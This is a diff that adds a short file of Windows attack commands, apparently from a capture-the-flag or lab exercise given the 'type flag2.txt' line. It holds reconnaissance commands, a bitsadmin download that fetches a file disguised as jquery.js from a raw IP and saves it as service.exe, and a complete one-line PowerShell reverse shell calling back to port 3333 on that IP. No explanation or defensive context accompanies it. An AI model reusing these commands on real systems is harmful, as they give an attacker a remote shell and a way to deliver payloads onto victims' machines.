@@ -1,0 +1,10 @@
+whoami
+dir
+netstat -ano
+tasklist
+
+type flag2.txt
+bitsadmin /transfer getFiles /download /priority normal http://158.247.195.222:80/js/jquery.js C:\Users\Public\staging\service.exe
+C:\\Windows\\legit.exe
+
+$client = New-Object System.Net.Sockets.TCPClient('158.247.195.222',3333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
